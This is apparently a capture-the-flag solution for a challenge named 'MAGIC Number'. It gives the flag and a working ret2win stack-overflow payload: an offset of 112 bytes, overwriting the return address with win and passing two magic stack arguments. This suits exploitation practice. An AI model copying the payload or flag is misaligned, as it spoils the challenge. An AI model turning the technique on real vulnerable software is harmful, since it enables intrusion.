The flag is `flag{c0ngr4ts_y0u_p0pp3d_my_st4ck_4nd_4ll_i_g0t_w4s_th1s_fl4g}`.

It’s a straight ret2win. `vuln()` uses `gets()` on a buffer at `[ebp-0x6c]`, and the saved return address is 112 bytes later. The real target is `win` at `0x08049284`, and it checks two stack arguments:

- `0xcafebebe`
- `0x13371337`

So the payload is:

```python
b"A"*112 +
p32(0x08049284) +
p32(0x41414141) +
p32(0xcafebebe) +
p32(0x13371337)
```

That works against the remote and prints the flag above.

MAGIC Number
